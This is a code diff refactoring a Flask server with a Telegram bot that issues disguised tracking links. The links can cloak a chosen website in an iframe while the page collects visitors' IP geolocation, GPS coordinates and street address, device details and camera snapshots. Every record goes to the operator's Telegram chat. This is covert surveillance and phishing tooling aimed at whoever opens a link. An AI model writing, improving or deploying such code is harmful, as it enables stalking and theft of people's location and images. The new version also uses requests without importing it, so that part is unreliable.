@@ -1,762 +1,338 @@
-# server.py - Flask app with Telegram webhook (single-file deploy)
-import os
-import uuid
-import base64
-import json
-import requests
-import re  
-from datetime import datetime
-from dotenv import load_dotenv
+"""
+server.py - Production-ready Flask server & Telegram Bot for interactive experiences and device telemetry.
+"""
+
+import sys
+import time
+import logging
+import threading
+from typing import Dict, Any
 from flask import (
     Flask,
     request,
-    send_from_directory,
-    render_template,
     jsonify,
-    url_for,
+    render_template,
+    send_from_directory,
+    abort
 )
-from urllib.parse import urlparse
+from werkzeug.utils import secure_filename
 
-# load .env in development
-load_dotenv()
+import config
+from storage.json_store import JsonSessionStore
+from services.session_service import SessionService
+from services.telemetry_service import TelemetryService
+from services.geo_service import GeoService
+from services.media_service import MediaService
+from services.event_service import EventService
+from services.telegram_service import TelegramService
 
-# ---------- Configuration ----------
-UPLOAD_DIR = "uploads"
-SESSIONS_FILE = "sessions.json"
-TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")  # required
-TELEGRAM_WEBHOOK_SECRET = os.environ.get(
-    "TELEGRAM_WEBHOOK_SECRET",
-    "webhook_" + (TELEGRAM_BOT_TOKEN or "no-token")[:8],
+# ---------- Logging Setup ----------
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
 )
+logger = logging.getLogger("server")
 
-os.makedirs(UPLOAD_DIR, exist_ok=True)
-
-# ---------- Flask app ----------
+# ---------- App & Service Initialization ----------
 app = Flask(__name__, template_folder="templates", static_folder="static")
+app.config["SECRET_KEY"] = config.SECRET_KEY
+app.config["MAX_CONTENT_LENGTH"] = config.MAX_UPLOAD_SIZE_BYTES
+
+# Wire dependencies
+session_store = JsonSessionStore(config.SESSIONS_FILE)
+session_service = SessionService(session_store)
+event_service = EventService(session_store)
+telegram_service = TelegramService(session_service)
+
+# Periodic cleanup of expired sessions
+session_store.cleanup_expired()
 
 
-# ---------- Persistence helpers ----------
-def load_sessions():
-    try:
-        with open(SESSIONS_FILE, "r", encoding="utf-8") as f:
-            return json.load(f)
-    except Exception:
-        return {}
+# ---------- Security Headers ----------
+@app.after_request
+def apply_security_headers(response):
+    response.headers["X-Content-Type-Options"] = "nosniff"
+    # Allow iframing only for wrapped endpoints
+    if not request.path.startswith("/w/"):
+        response.headers["X-Frame-Options"] = "SAMEORIGIN"
+    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
+    return response
 
 
-def save_sessions(sessions):
-    try:
-        with open(SESSIONS_FILE, "w", encoding="utf-8") as f:
-            json.dump(sessions, f)
-    except Exception as e:
-        print("Failed to save sessions:", e)
+# ---------- Error Handlers ----------
+@app.errorhandler(400)
+def bad_request_handler(e):
+    return jsonify({"error": "bad_request", "message": str(e)}), 400
 
 
-SESSIONS = load_sessions()
+@app.errorhandler(404)
+def not_found_handler(e):
+    return jsonify({"error": "not_found", "message": "Resource not found"}), 404
 
 
-# ---------- Helpers ----------
-def telegram_api(method: str, data=None, files=None, timeout=30):
-    if not TELEGRAM_BOT_TOKEN:
-        return None, "no_token"
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/{method}"
-    try:
-        if files is None:
-            r = requests.post(url, json=data or {}, timeout=timeout)
-        else:
-            r = requests.post(url, data=data or {}, files=files or {}, timeout=timeout)
-        return r, None
-    except Exception as e:
-        return None, str(e)
+@app.errorhandler(413)
+def request_entity_too_large(e):
+    return jsonify({"error": "payload_too_large", "message": "File exceeds maximum size"}), 413
 
 
-def tg_send_text(chat_id: str, text: str):
-    if not TELEGRAM_BOT_TOKEN or not chat_id:
-        return False
-    payload = {"chat_id": str(chat_id), "text": text}
-    r, _ = telegram_api("sendMessage", data=payload)
-    return bool(r and r.ok)
+@app.errorhandler(500)
+def internal_error_handler(e):
+    logger.error(f"Internal server error: {e}", exc_info=True)
+    return jsonify({"error": "internal_error", "message": "An unexpected error occurred"}), 500
 
 
-def tg_send_photo(chat_id: str, photo_path: str, caption: str = None):
-    if not TELEGRAM_BOT_TOKEN or not chat_id:
-        return False
-    try:
-        with open(photo_path, "rb") as f:
-            files = {"photo": f}
-            data = {"chat_id": str(chat_id)}
-            if caption:
-                data["caption"] = caption
-            r, _ = telegram_api("sendPhoto", data=data, files=files)
-            return bool(r and r.ok)
-    except Exception as e:
-        print("tg_send_photo error:", e)
-        return False
-
-
-def is_valid_http_url(u: str):
-    try:
-        p = urlparse(u)
-        return p.scheme in ("http", "https") and bool(p.netloc)
-    except Exception:
-        return False
-
-
-def normalize_url_for_wrap(text: str):
-    if not text:
-        return None
-    u = text.strip()
-    if not u:
-        return None
-    p = urlparse(u)
-    if not p.scheme:
-        u = "https://" + u
-        p = urlparse(u)
-    if p.scheme not in ("http", "https") or not p.netloc:
-        return None
-    return u
-
-
-def extract_client_ip(raw_ip: str):
-    """
-    X-Forwarded-For often looks like "client, proxy1, proxy2".
-    We only care about the first address.
-    """
-    if not raw_ip:
-        return "unknown"
-    parts = [p.strip() for p in raw_ip.split(",") if p.strip()]
-    return parts[0] if parts else raw_ip
-
-
-def geoip_lookup(ip: str):
-    if not ip or ip == "unknown":
-        return None
-    try:
-        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=2)
-        if resp.ok:
-            return resp.json()
-        print("GeoIP non-ok:", resp.status_code, resp.text[:200])
-    except Exception as e:
-        print("GeoIP lookup failed:", e)
-    return None
-
-
-def reverse_geocode_from_coords(coords: dict):
-    """
-    Best-effort reverse geocode to human-readable address from GPS coordinates.
-    Uses OpenStreetMap Nominatim.
-    """
-    if not isinstance(coords, dict):
-        return None
-    lat = coords.get("lat")
-    lon = coords.get("lon")
-    if lat is None or lon is None:
-        return None
-    try:
-        resp = requests.get(
-            "https://nominatim.openstreetmap.org/reverse",
-            params={"lat": lat, "lon": lon, "format": "jsonv2"},
-            headers={"User-Agent": "consented-session-bot/1.0"},
-            timeout=3,
-        )
-        if resp.ok:
-            j = resp.json()
-            return j.get("display_name") or None
-        print("Reverse geocode non-ok:", resp.status_code, resp.text[:200])
-    except Exception as e:
-        print("Reverse geocode failed:", e)
-    return None
-def guess_device_model(ua: str):
-    if not ua:
-        return None
-    # crude Android model guess: part after "Android ...;"
-    m = re.search(r"Android [^;]*; ([^;/\)]+)", ua)
-    if m:
-        return m.group(1).strip()
-    return None
-
-
-def guess_os_name(ua: str, platform: str):
-    ua = ua or ""
-    platform = platform or ""
-    if "Android" in ua:
-        return "Android"
-    if "iPhone" in ua or "iPad" in ua or "iOS" in ua:
-        return "iOS"
-    if "Windows NT" in ua:
-        return "Windows"
-    if "Mac OS X" in ua:
-        return "macOS"
-    if "Linux" in ua and "Android" not in ua:
-        return "Linux"
-    return platform or "unknown"
-
-
-# ---------- Basic endpoints ----------
+# ---------- Public & Experience Routes ----------
 @app.route("/")
 def index():
-    return (
-        "Flask server for consented device session. Use the Telegram bot to create sessions.",
-        200,
-    )
-
-
-# Plain session creation (no embedded site)
-@app.route("/create", methods=["POST"])
-def create_session():
-    data = request.get_json(silent=True) or {}
-    label = data.get("label", "")
-    chat_id = data.get("chat_id")
-    token = uuid.uuid4().hex
-    SESSIONS[token] = {
-        "label": label,
-        "created_at": datetime.utcnow().isoformat(),
-        "visits": [],
-        "chat_id": chat_id,
-    }
-    save_sessions(SESSIONS)
-    link = url_for("session_page", token=token, _external=True)
-    if chat_id:
-        tg_send_text(
-            chat_id,
-            f"Plain session created\n"
-            f"Token: {token}\n"
-            f"{link}",
-        )
-    return jsonify({"token": token, "link": link})
+    return jsonify({
+        "status": "online",
+        "service": "Device Telemetry & Experience Platform",
+        "version": "2.0.0",
+        "available_experiences": len(config.EXPERIENCES)
+    }), 200
 
 
 @app.route("/s/<token>")
 def session_page(token):
-    if token not in SESSIONS:
-        return "Invalid token", 404
-    try:
-        return render_template("session.html", token=token)
-    except Exception:
-        return f"Session page for {token}", 200
+    """Render the configured experience for a session."""
+    valid, reason, session = session_service.validate_active_session(token)
+    if not valid or not session:
+        return render_template("session.html",
+            token=token,
+            experience_name="Session Unavailable",
+            experience="error",
+            experience_template="experiences/custom.html"
+        ), 404 if reason == "Session not found" else 403
 
+    exp_id = session.get("experience", config.DEFAULT_EXPERIENCE)
+    exp_meta = config.EXPERIENCES.get(exp_id, config.EXPERIENCES[config.DEFAULT_EXPERIENCE])
 
-# Wrapped session creation (embed a target URL)
-@app.route("/wrap_create", methods=["POST"])
-def wrap_create():
-    data = request.get_json(silent=True) or {}
-    target_url = data.get("target_url", "").strip()
+    # If experience is wrapper, redirect to wrapper route
+    if exp_id == "wrapped_website":
+        return wrapper_page(token)
 
-    if not is_valid_http_url(target_url):
-        return jsonify({"error": "invalid_url"}), 400
-
-    label = data.get("label", "")
-    chat_id = data.get("chat_id")
-    token = uuid.uuid4().hex
-    SESSIONS[token] = {
-        "label": label,
-        "created_at": datetime.utcnow().isoformat(),
-        "visits": [],
-        "chat_id": chat_id,
-        "target_url": target_url,
-        "wrap": True,
-    }
-    save_sessions(SESSIONS)
-    link = url_for("wrapper_page", token=token, _external=True)
-    if chat_id:
-        tg_send_text(chat_id, link)
-    return jsonify({"token": token, "link": link})
+    return render_template(
+        "session.html",
+        token=token,
+        experience=exp_id,
+        experience_name=exp_meta["name"],
+        experience_template=exp_meta["template"]
+    )
 
 
 @app.route("/w/<token>")
 def wrapper_page(token):
-    if token not in SESSIONS:
-        return "Invalid token", 404
-    target = SESSIONS[token].get("target_url", "")
-    try:
-        return render_template("wrapper.html", token=token, target_url=target)
-    except Exception:
-        return f"Wrapper page for {token} -> {target}", 200
+    """Render the iframe cloaked wrapper for an external site."""
+    valid, reason, session = session_service.validate_active_session(token)
+    if not valid or not session:
+        return f"<h3>Session {reason}</h3>", 404 if reason == "Session not found" else 403
+
+    target_url = session.get("target_url") or "https://example.com"
+    return render_template("wrapper.html", token=token, target_url=target_url)
 
 
-# ---------- upload_info with GeoIP and extra details ----------
+@app.route("/session_config/<token>")
+def session_config(token):
+    """API endpoint providing client with its session configuration."""
+    session = session_service.get_session(token)
+    if not session:
+        return jsonify({"error": "not_found"}), 404
+
+    return jsonify({
+        "token": session["token"],
+        "status": session.get("status", "active"),
+        "experience": session.get("experience"),
+        "label": session.get("label"),
+        "expires_at": session.get("expires_at")
+    })
+
+
+# ---------- Telemetry & Media Ingestion ----------
 @app.route("/upload_info/<token>", methods=["POST"])
 def upload_info(token):
-    if token not in SESSIONS:
-        return "Invalid token", 404
+    """Ingest hardware specifications, battery, network, and location."""
+    valid, reason, session = session_service.validate_active_session(token)
+    if not valid or not session:
+        return jsonify({"error": "invalid_session", "reason": reason}), 403
 
     payload = request.get_json(silent=True) or {}
-    battery = payload.get("battery")
-    coords = payload.get("coords")
-    details = payload.get("details")
-    note = payload.get("note")
-
     raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    ip = extract_client_ip(raw_ip)
-    timestamp = datetime.utcnow().isoformat()
 
-    geo = geoip_lookup(ip)
-    human_address = reverse_geocode_from_coords(coords) if coords else None
+    # Normalize incoming telemetry
+    telemetry = TelemetryService.process_telemetry(payload, raw_ip)
 
-    entry = {
-        "timestamp": timestamp,
-        "ip": ip,
-        "battery": battery,
-        "coords": coords,
-        "details": details,
+    # GeoIP and Reverse Geocoding
+    geo = GeoService.lookup_ip(telemetry["ip"])
+    address = None
+    if telemetry.get("coords"):
+        coords = telemetry["coords"]
+        address = GeoService.reverse_geocode(coords["lat"], coords["lon"])
+
+    # Record visit
+    visit_record = {
+        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+        "ip": telemetry["ip"],
+        "battery": telemetry.get("battery"),
+        "coords": telemetry.get("coords"),
+        "address": address,
         "geo": geo,
-        "note": note,
-        "address": human_address,
+        "os": telemetry.get("os"),
+        "device_model": telemetry.get("device_model")
     }
 
-    SESSIONS[token].setdefault("visits", []).append(entry)
-    save_sessions(SESSIONS)
+    session.setdefault("visits", []).append(visit_record)
+    session["telemetry"] = telemetry
+    session_store.save(token, session)
 
-    chat_id = SESSIONS[token].get("chat_id")
+    # Dispatch Telegram notification
+    telegram_service.notify_telemetry(session, telemetry, geo, address)
 
-    # If this is just a page-closed beacon (no real data), don't spam Telegram.
-    if not chat_id:
-        return jsonify({"status": "ok", "stored": entry})
-    if battery is None and coords is None and details is None:
-        return jsonify({"status": "ok", "stored": entry})
+    return jsonify({"status": "ok", "recorded": True})
 
-    # -------- Battery ----------
-    if isinstance(battery, dict):
-        lvl = battery.get("level")
-        chg = battery.get("charging")
-        try:
-            if lvl is not None:
-                lvl = round(float(lvl))
-                bat_txt = f"{lvl}%{' (charging)' if chg else ''}"
-            else:
-                bat_txt = "unknown"
-        except Exception:
-            bat_txt = str(battery)
-    else:
-        bat_txt = "unknown"
 
-    # -------- GPS ----------
-    loc_txt = "unknown"
-    acc_m = None
-    if isinstance(coords, dict):
-        lat = coords.get("lat")
-        lon = coords.get("lon")
-        acc_m = coords.get("acc") or coords.get("accuracy")
-        if lat is not None and lon is not None:
-            if acc_m is not None:
-                loc_txt = f"{lat},{lon} (±{acc_m} m)"
-            else:
-                loc_txt = f"{lat},{lon}"
-        else:
-            loc_txt = str(coords)
-
-    # ---------- GeoIP ----------
-    city = region = country = isp = "unknown"
-    if isinstance(geo, dict):
-        city = geo.get("city") or "unknown"
-        region = geo.get("region") or geo.get("region_code") or "unknown"
-        country = geo.get("country_name") or geo.get("country") or "unknown"
-        isp = geo.get("org") or geo.get("asn") or "unknown"
-
-    # ---------- Device / HW details ----------
-    d = details or {}
-    ua = d.get("userAgent", "") or ""
-    platform = d.get("platform") or ""
-    cpu = d.get("cpuCores")
-    ram = d.get("ramGB")
-    langs = d.get("languages")
-    scr = d.get("screen") or {}
-    net = d.get("network") or {}
-    perms = d.get("permissions") or {}
-    tz = d.get("tz") or {}
-    storage = d.get("storage") or {}
-
-    ua_short = ua[:80] + ("…" if len(ua) > 80 else "")
-    os_name = guess_os_name(ua, platform)
-    model_guess = guess_device_model(ua)
-
-    scr_w = scr.get("w")
-    scr_h = scr.get("h")
-    scr_ratio = scr.get("ratio")
-
-    net_type = net.get("type") or "?"
-    net_dl = net.get("downlink")
-    try:
-        if net_dl is not None:
-            net_dl = round(float(net_dl), 1)
-    except Exception:
-        pass
-
-    cam_perm = perms.get("camera")
-    geo_perm = perms.get("geolocation")
-
-    tz_name = tz.get("zone") if isinstance(tz, dict) else None
-    tz_off = tz.get("offset") if isinstance(tz, dict) else None
-
-    quota_b = storage.get("quotaBytes")
-    usage_b = storage.get("usageBytes")
-    quota_gb = usage_gb = None
-    try:
-        if quota_b:
-            quota_gb = round(quota_b / 1e9, 1)
-        if usage_b:
-            usage_gb = round(usage_b / 1e9, 1)
-    except Exception:
-        pass
-
-    # ---------- Build Telegram message ----------
-    lines = [
-        f"📡 Session {token} — INFO",
-        f"⏱ Time: {timestamp}",
-        f"🌍 IP: {ip}",
-        f"🏙 GeoIP: {city}, {region}, {country}",
-        f"🏢 ISP: {isp}",
-        "",
-        f"🔋 Battery: {bat_txt}",
-        f"📍 GPS: {loc_txt}",
-    ]
-
-    if human_address:
-        lines.append(f"🏠 Address: {human_address}")
-
-    # GPS accuracy warning
-    if acc_m is not None and acc_m > 2000:
-        km = round(acc_m / 1000, 1)
-        lines.append(f"⚠️ GPS accuracy very low (~{km} km) — address may be off.")
-
-    main_device = os_name
-    if model_guess:
-        main_device += f" · {model_guess}"
-    if ua_short:
-        main_device += f" | {ua_short}"
-    lines.append(f"📱 Device: {main_device}")
-
-    extra_hw = []
-    if ram is not None:
-        extra_hw.append(f"RAM {ram} GB")
-    if cpu is not None:
-        extra_hw.append(f"CPU {cpu} cores")
-    if quota_gb is not None:
-        if usage_gb is not None:
-            extra_hw.append(f"Storage {usage_gb}/{quota_gb} GB used")
-        else:
-            extra_hw.append(f"Storage {quota_gb} GB")
-    if extra_hw:
-        lines.append("💾 " + " · ".join(extra_hw))
-
-    if langs:
-        try:
-            langs_txt = ", ".join(langs[:3])
-            lines.append(f"🌐 Lang: {langs_txt}")
-        except Exception:
-            pass
-
-    if scr_w and scr_h:
-        scr_part = f"{scr_w}×{scr_h}"
-        if scr_ratio:
-            scr_part += f" ({scr_ratio}x)"
-        lines.append(f"🖥 Screen: {scr_part}")
-
-    net_parts = []
-    if net_type and net_type != "?":
-        net_parts.append(net_type.upper())
-    if net_dl is not None:
-        net_parts.append(f"{net_dl} Mbps")
-    if net_parts:
-        lines.append("📶 Network: " + " ".join(net_parts))
-
-    if tz_name or tz_off is not None:
-        tz_line = "🕒 Timezone: "
-        if tz_name:
-            tz_line += tz_name
-        if tz_off is not None:
-            tz_line += f" (offset {tz_off} min)"
-        lines.append(tz_line)
-
-    perm_bits = []
-    if cam_perm:
-        perm_bits.append(f"camera={cam_perm}")
-    if geo_perm:
-        perm_bits.append(f"geolocation={geo_perm}")
-    if perm_bits:
-        lines.append("✅ Permissions: " + ", ".join(perm_bits))
-
-    msg = "\n".join(lines)
-    tg_send_text(chat_id, msg)
-
-    return jsonify({"status": "ok", "stored": entry})
-
-# ---------- upload_image ----------
 @app.route("/upload_image/<token>", methods=["POST"])
 def upload_image(token):
-    if token not in SESSIONS:
-        return "Invalid token", 404
+    """Ingest camera frame snapshot."""
+    valid, reason, session = session_service.validate_active_session(token)
+    if not valid or not session:
+        return jsonify({"error": "invalid_session", "reason": reason}), 403
 
     data = request.get_json(silent=True) or {}
     b64 = data.get("image_b64")
-    coords = data.get("coords")
-    battery = data.get("battery")
-    details = data.get("details") or {}
 
-    raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    ip = extract_client_ip(raw_ip)
-    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
+    ok, msg, filename = MediaService.save_base64_image(token, b64)
+    if not ok or not filename:
+        return jsonify({"error": "upload_failed", "message": msg}), 400
 
-    if not b64:
-        return ("No image", 400)
-    if b64.startswith("data:"):
-        b64 = b64.split(",", 1)[1]
-    img = base64.b64decode(b64)
+    # Save to session
+    session.setdefault("media", []).append(filename)
+    session_store.save(token, session)
 
-    filename = f"{token}_{uuid.uuid4().hex}.jpg"
-    path = os.path.join(UPLOAD_DIR, filename)
-    with open(path, "wb") as f:
-        f.write(img)
+    # Send photo to Telegram
+    photo_path = str(config.UPLOAD_DIR / filename)
+    caption_details = f"IP: {request.remote_addr}"
+    telegram_service.notify_photo(session, photo_path, caption_details=caption_details)
 
-    SESSIONS[token].setdefault("files", []).append(filename)
-    save_sessions(SESSIONS)
+    return jsonify({"status": "ok", "filename": filename})
 
-    # ---------- Build caption (FULL specs identical to INFO) ----------
-    geo = geoip_lookup(ip)
-    city = geo.get("city") if geo else "unknown"
-    region = geo.get("region") if geo else "unknown"
-    country = geo.get("country_name") if geo else "unknown"
-    isp = geo.get("org") if geo else "unknown"
 
-    # Battery
-    if isinstance(battery, dict) and battery.get("level") is not None:
-        bat_txt = f"{battery['level']}%{' (charging)' if battery.get('charging') else ''}"
-    else:
-        bat_txt = "unknown"
+@app.route("/upload_photo/<token>", methods=["POST"])
+def upload_photo(token):
+    """Ingest user-selected media file."""
+    valid, reason, session = session_service.validate_active_session(token)
+    if not valid or not session:
+        return jsonify({"error": "invalid_session", "reason": reason}), 403
 
-    # GPS
-    if isinstance(coords, dict):
-        loc_txt = f"{coords.get('lat')},{coords.get('lon')} ±{coords.get('acc')}m"
-    else:
-        loc_txt = "unknown"
+    data = request.get_json(silent=True) or {}
+    b64 = data.get("image_b64")
 
-    # Device Specs
-    ua = details.get("userAgent", "")
-    platform = details.get("platform", "")
-    os_name = guess_os_name(ua, platform)
-    model = guess_device_model(ua)
-    cpu = details.get("cpuCores")
-    ram = details.get("ramGB")
-    langs = details.get("languages") or []
-    scr = details.get("screen") or {}
-    net = details.get("network") or {}
-    tz = details.get("tz") or {}
-    storage = details.get("storage") or {}
+    ok, msg, filename = MediaService.save_base64_image(token, b64)
+    if not ok or not filename:
+        return jsonify({"error": "upload_failed", "message": msg}), 400
 
-    caption = f"""📷 Session {token} — PHOTO
-⏱ Time: {timestamp}
-🌍 IP: {ip}
-🏙 GeoIP: {city}, {region}, {country}
-🏢 ISP: {isp}
-🔋 Battery: {bat_txt}
-📍 GPS: {loc_txt}
-📱 Device: {os_name} {'· '+model if model else ''}
+    session.setdefault("media", []).append(filename)
+    session_store.save(token, session)
 
-💾 RAM: {ram} GB | CPU: {cpu} cores
-🗄 Storage: {storage.get('usageBytes','?')} / {storage.get('quotaBytes','?')} bytes
-🖥 Screen: {scr.get('w')}×{scr.get('h')} ({scr.get('ratio')}x)
-🌐 Network: {net.get('type')} {net.get('downlink')} Mbps
-🕒 Timezone: {tz.get('zone')} (UTC offset {tz.get('offset')} min)
-🌎 Languages: {", ".join(langs[:5])}
-"""
+    photo_path = str(config.UPLOAD_DIR / filename)
+    telegram_service.notify_photo(session, photo_path, caption_details="User uploaded photo file.")
 
-    chat_id = SESSIONS[token].get("chat_id")
-    if chat_id:
-        if not tg_send_photo(chat_id, path, caption=caption):
-            tg_send_text(chat_id, f"Image saved:\n{url_for('serve_upload', filename=filename, _external=True)}\n\n{caption}")
+    return jsonify({"status": "ok", "filename": filename})
 
-    return jsonify({"status": "ok", "file": filename})
 
+@app.route("/event/<token>", methods=["POST"])
+def log_event_route(token):
+    """Log a gameplay or lifecycle event."""
+    valid, reason, session = session_service.validate_active_session(token)
+    if not valid or not session:
+        return jsonify({"error": "invalid_session", "reason": reason}), 403
+
+    data = request.get_json(silent=True) or {}
+    event_name = data.get("event", "GENERIC_EVENT")
+    metadata = data.get("metadata", {})
+
+    event_service.log_event(token, event_name, metadata)
+    return jsonify({"status": "ok"})
+
+
+@app.route("/session_exit/<token>", methods=["POST"])
+def session_exit(token):
+    """Handle beacon signal on tab or browser exit."""
+    session = session_service.get_session(token)
+    if session:
+        event_service.log_event(token, "SESSION_EXITED")
+    return jsonify({"status": "ok"}), 200
 
 
 @app.route("/session_data/<token>")
 def session_data(token):
-    if token not in SESSIONS:
-        return "Invalid token", 404
-    return jsonify(SESSIONS[token])
+    """Retrieve raw session JSON data."""
+    session = session_service.get_session(token)
+    if not session:
+        return jsonify({"error": "not_found"}), 404
+    return jsonify(session)
 
 
 @app.route("/uploads/<filename>")
 def serve_upload(filename):
-    return send_from_directory(UPLOAD_DIR, filename)
+    """Safely serve media uploads with security headers."""
+    safe_name = secure_filename(filename)
+    if safe_name != filename:
+        abort(404)
+    return send_from_directory(config.UPLOAD_DIR, safe_name)
 
 
-# ---------- Telegram webhook ----------
-@app.route(f"/telegram/{TELEGRAM_WEBHOOK_SECRET}", methods=["POST"])
+# ---------- Telegram Webhook Endpoint ----------
+@app.route(f"/telegram/{config.TELEGRAM_WEBHOOK_SECRET}", methods=["POST"])
 def telegram_webhook():
-    if not TELEGRAM_BOT_TOKEN:
-        return "no token", 403
+    """Webhook entry point for incoming Telegram updates."""
+    if not config.TELEGRAM_BOT_TOKEN:
+        return "Bot token not configured", 503
+
     update = request.get_json(silent=True)
     if not update:
-        return "no json", 400
+        return "Invalid payload", 400
 
-    try:
-        msg = update.get("message") or update.get("edited_message") or {}
-        if not msg:
-            return "ok", 200
-
-        chat = msg.get("chat", {})
-        chat_id = chat.get("id")
-        text = (msg.get("text") or "").strip()
-        if not text or chat_id is None:
-            return "ok", 200
-
-        # /start: show help
-        if text.lower().startswith("/start"):
-            tg_send_text(
-                chat_id,
-                "Commands:\n"
-                "/create [label]  – create plain session\n"
-                "/wrap <url>      – create embedded tracking link for a site\n"
-                "/status <token>  – show session summary",
-            )
-            return "ok", 200
-
-        # /create [label]
-        if text.lower().startswith("/create"):
-            parts = text.split(maxsplit=1)
-            label = parts[1] if len(parts) > 1 else ""
-            try:
-                r = requests.post(
-                    url_for("create_session", _external=True),
-                    json={"label": label, "chat_id": str(chat_id)},
-                    timeout=5,
-                )
-                if r.ok:
-                    data = r.json()
-                    tg_send_text(chat_id, data["link"])
-                else:
-                    tg_send_text(
-                        chat_id, f"Failed to create session: {r.status_code}"
-                    )
-            except Exception as e:
-                print("create command error:", e)
-                tg_send_text(chat_id, "Server error while creating session.")
-            return "ok", 200
-
-        # /wrap <url>
-        if text.lower().startswith("/wrap"):
-            parts = text.split(maxsplit=1)
-            if len(parts) < 2:
-                tg_send_text(
-                    chat_id,
-                    "Usage: /wrap <url>\nExample: /wrap https://unstop.com",
-                )
-                return "ok", 200
-            raw = parts[1].strip()
-            url = normalize_url_for_wrap(raw)
-            if not url:
-                tg_send_text(
-                    chat_id,
-                    "Invalid URL. Include domain, e.g. https://example.com",
-                )
-                return "ok", 200
-            try:
-                r = requests.post(
-                    url_for("wrap_create", _external=True),
-                    json={"target_url": url, "label": "", "chat_id": str(chat_id)},
-                    timeout=5,
-                )
-                if r.ok:
-                    data = r.json()
-                    tg_send_text(chat_id, data["link"])
-                else:
-                    tg_send_text(
-                        chat_id,
-                        f"Failed to create wrapped session: {r.status_code}",
-                    )
-            except Exception as e:
-                print("wrap command error:", e)
-                tg_send_text(chat_id, "Server error while creating wrapped session.")
-            return "ok", 200
-
-        # /status <token>
-        if text.lower().startswith("/status"):
-            parts = text.split(maxsplit=1)
-            if len(parts) < 2:
-                tg_send_text(chat_id, "Usage: /status <token>")
-                return "ok", 200
-            token = parts[1].strip()
-            try:
-                r = requests.get(
-                    url_for("session_data", token=token, _external=True), timeout=5
-                )
-                if r.status_code != 200:
-                    tg_send_text(
-                        chat_id, f"Server returned {r.status_code}: {r.text}"
-                    )
-                    return "ok", 200
-                data = r.json()
-                visits = data.get("visits", [])
-                summary = (
-                    f"Session {token}\n"
-                    f"Label: {data.get('label')}\n"
-                    f"Created: {data.get('created_at')}\n"
-                    f"Total events: {len(visits)}"
-                )
-                tg_send_text(chat_id, summary)
-                for v in visits[-5:]:
-                    bat = v.get("battery")
-                    if isinstance(bat, dict):
-                        lvl = bat.get("level")
-                        chg = bat.get("charging")
-                        try:
-                            if lvl is not None:
-                                lvl = round(float(lvl))
-                                bat_txt = f"{lvl}%{' (charging)' if chg else ''}"
-                            else:
-                                bat_txt = "unknown"
-                        except Exception:
-                            bat_txt = str(bat)
-                    else:
-                        bat_txt = "unknown"
-
-                    coords = v.get("coords")
-                    if isinstance(coords, dict):
-                        lat = coords.get("lat")
-                        lon = coords.get("lon")
-                        acc = coords.get("acc") or coords.get("accuracy")
-                        if lat is not None and lon is not None:
-                            if acc is not None:
-                                loc_txt = f"{lat},{lon} (±{acc} m)"
-                            else:
-                                loc_txt = f"{lat},{lon}"
-                        else:
-                            loc_txt = str(coords)
-                    else:
-                        loc_txt = "unknown"
-
-                    line = (
-                        f"Time: {v.get('timestamp')}\n"
-                        f"IP: {v.get('ip')}\n"
-                        f"Battery: {bat_txt}\n"
-                        f"GPS: {loc_txt}"
-                    )
-                    tg_send_text(chat_id, line)
-            except Exception as e:
-                print("status command error:", e)
-                tg_send_text(chat_id, f"Failed to fetch status: {e}")
-            return "ok", 200
-
-        # Fallback
-        tg_send_text(
-            chat_id,
-            "Unknown command.\n"
-            "Use:\n"
-            "/create [label]\n"
-            "/wrap <url>\n"
-            "/status <token>",
-        )
-        return "ok", 200
-
-    except Exception as e:
-        print("Telegram webhook error:", e)
-
+    # Process asynchronously or in-memory without loopback HTTP calls
+    telegram_service.process_update(update)
     return "ok", 200
 
 
-# ---------- Run ----------
+# ---------- Background Polling Worker for Local Development ----------
+def run_telegram_polling():
+    """
+    Long-polling worker allowing developers to test the Telegram bot locally
+    without needing a public webhook URL or tunnel.
+    """
+    token = config.TELEGRAM_BOT_TOKEN
+    if not token:
+        logger.info("No TELEGRAM_BOT_TOKEN set, skipping polling worker.")
+        return
+
+    logger.info("Starting Telegram Bot long-polling worker in background...")
+    offset = 0
+    while True:
+        try:
+            url = f"https://api.telegram.org/bot{token}/getUpdates"
+            params = {"offset": offset, "timeout": 25}
+            resp = requests.get(url, params=params, timeout=30)
+            if resp.ok:
+                data = resp.json()
+                for update in data.get("result", []):
+                    offset = update["update_id"] + 1
+                    telegram_service.process_update(update)
+            else:
+                time.sleep(3)
+        except Exception as e:
+            logger.debug(f"Polling check exception (normal during network changes): {e}")
+            time.sleep(4)
+
+
+# ---------- Main Execution ----------
 if __name__ == "__main__":
-    debug_mode = os.environ.get("FLASK_DEBUG", "0") in ("1", "true", "True")
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port, debug=debug_mode)
+    # If --poll flag or POLLING_MODE env is set, launch polling worker in background thread
+    if "--poll" in sys.argv or "--polling" in sys.argv:
+        poll_thread = threading.Thread(target=run_telegram_polling, daemon=True)
+        poll_thread.start()
+
+    logger.info(f"Starting server on 0.0.0.0:{config.PORT} (Debug: {config.FLASK_DEBUG})")
+    app.run(host="0.0.0.0", port=config.PORT, debug=config.FLASK_DEBUG)
